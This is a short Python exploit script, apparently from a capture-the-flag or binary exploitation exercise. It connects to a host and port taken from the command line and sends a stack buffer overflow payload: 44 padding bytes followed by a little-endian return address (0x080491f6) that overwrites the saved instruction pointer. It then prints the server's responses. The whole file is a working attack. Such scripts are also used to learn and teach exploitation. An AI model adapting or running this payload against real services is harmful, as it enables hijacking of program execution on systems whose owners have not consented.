#!/usr/bin/env python3

import socket
from argparse import ArgumentParser
import struct

# parse console arguments
parser = ArgumentParser()
parser.add_argument('host', type=str, help="addr or ip to connect")
parser.add_argument('port', type=int, help="port to connect")

args = parser.parse_args()
[host, port] = [args.host, args.port]

# create payload
offset = 44
new_eip = struct.pack("<I", 0x080491f6)

payload = b"".join([
    b"A" * offset,
    new_eip,
    b"\n"
])

# connect to server
conn = socket.socket()
conn.connect((host, port))
print(conn.recv(4096).decode('utf-8'))
conn.send(payload)
print(conn.recv(4096).decode('utf-8'))
print(conn.recv(4096).decode('utf-8'))